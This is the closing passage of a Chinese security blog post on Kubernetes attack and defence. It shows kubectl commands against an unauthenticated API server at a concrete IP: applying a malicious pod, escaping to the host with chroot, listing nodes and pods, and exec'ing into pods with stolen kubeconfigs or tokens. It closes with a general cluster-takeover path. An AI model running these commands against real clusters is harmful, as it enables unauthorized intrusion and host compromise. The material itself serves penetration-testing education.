+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">kubectl</span> <span class="string">-s</span> <span class="string">http://34.100.182.227:8080/</span> <span class="string">apply</span> <span class="string">-f</span> <span class="string">evilPod.yaml</span></span><br></pre></td></tr></table></figure>
+
+<p>成功创建</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114131712-sugjka7.png" alt="image"></p>
+<p>进入容器执行命令<code>chroot /host /bin/sh</code>或<code>chroot /host /bin/bash</code>逃逸即可</p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//列出所有node</span><br><span class="line">kubectl -s http://34.100.182.227:8080/ get nodes</span><br><span class="line"></span><br><span class="line">//带namespace列出所有pod</span><br><span class="line">kubectl -s http://34.100.182.227:8080/ get pods -A</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114112755-q8xk0g0.png" alt="image"></p>
+<p>进入容器执行命令</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//api server未授权时</span><br><span class="line">kubectl -s http://34.100.182.227:8080/ exec --namespace=default -it demo123 -- bash</span><br><span class="line"></span><br><span class="line"># 获取到kubeconfig文件时</span><br><span class="line">kubectl --kubeconfig config --namespace=default exec -it demo123 -- bash</span><br><span class="line"></span><br><span class="line"># 获取到高权限token时</span><br><span class="line">kubectl --server=https://x.x.x.x:6443 --token=&quot;&lt;token值&gt;&quot; --insecure-skip-tls-verify --namespace=default exec -it demo123 -- bash</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>思考了一下<code>k8s</code>集群渗透的通用思路</p>
+<p>(1) 外网打点拿<code>Shell</code> –&gt; 发现是<code>docker</code>容器 –&gt; 逃逸，获取<code>Node</code>权限 -&gt; 尝试从<code>Node</code>横向至<code>Master</code>节点</p>
+<p>(2) 从外网打进内网后，发现内网有<code>k8s</code>服务，可能存在<code>API Server/etcd</code>等未授权&#x2F;其他漏洞，尝试接管集群</p>
+<p>‍</p>
+<hr>
+<p>‍</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://psych.green/2024/05/07/%E4%BA%91%E5%8E%9F%E7%94%9F-K8S%E5%AE%89%E5%85%A8/#Deployment-%E7%89%B9%E6%80%A7">https://psych.green/2024/05/07/%E4%BA%91%E5%8E%9F%E7%94%9F-K8S%E5%AE%89%E5%85%A8/#Deployment-%E7%89%B9%E6%80%A7</a></p>
+<p><a target="_blank" rel="noopener" href="https://psych.green/2024/03/15/k8s%E5%8D%95%E4%B8%BB%E6%9C%BA%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8Cdebugggggg/#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4-Namespace">https://psych.green/2024/03/15/k8s%E5%8D%95%E4%B8%BB%E6%9C%BA%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8Cdebugggggg/#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4-Namespace</a></p>
+<p><a target="_blank" rel="noopener" href="https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2026/01/12/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8_cos/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2026-01-13 09:15:00
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2026/01/15/Fastjson%201.2.68%20%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%20&%20MySQL%20JDBC%20&%20%E4%BE%9D%E8%B5%96%E6%8E%A2%E6%B5%8BTrick_cos/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#k8s-%E6%94%BB%E9%98%B2"><span class="toc-text">k8s 攻防</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-text">未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#API-Server-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-text">API Server 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E7%89%B9%E5%AE%9AAPI%E8%8E%B7%E5%8F%96token"><span class="toc-text">访问特定API获取token</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Secrets%E8%B5%84%E6%BA%90"><span class="toc-text">获取Secrets资源</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kubelet-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-text">kubelet 未授权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#etcd-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-text">etcd 未授权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#K8s-Dashboard-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-text">K8s Dashboard 未授权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pod-Service-Account-Token"><span class="toc-text">Pod - Service Account Token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Node-kubeconfig"><span class="toc-text">Node - kubeconfig</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%A1%E7%82%B9%E6%A8%AA%E5%90%91"><span class="toc-text">污点横向</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E9%80%83%E9%80%B8"><span class="toc-text">权限提升 &amp; 逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pod-Node-%E9%80%83%E9%80%B8"><span class="toc-text">Pod -&gt; Node 逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8Fpod"><span class="toc-text">创建恶意pod</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-text">思考</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2026 Oranges</a>
+      
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+      
+    </div>
+  
+  
+    <div class="footer-views">
+      
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+      
+    </div>
+  
+</div>
+
+
+  <script src="https://unpkg.com/mermaid@10.9.1/dist/mermaid.min.js"></script>
+  <script>
+    if (window.mermaid) {
+      var options = {"startOnLoad":true,"theme":"default"};
+      window.mermaid.initialize(options);
+      window.mermaid.run({ querySelector: '.mermaid' });
+    }
+  </script>
+
+
+
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Claude%20Code%20Context%20Compact + '&url=' + http%3A%2F%2Fkagty1.github.io%2F2026%2F01%2F13%2Fk8s%2520%25E6%2594%25BB%25E9%2598%25B2_cos%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/2026/01/13/k8s%20%E6%94%BB%E9%98%B2_cos/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
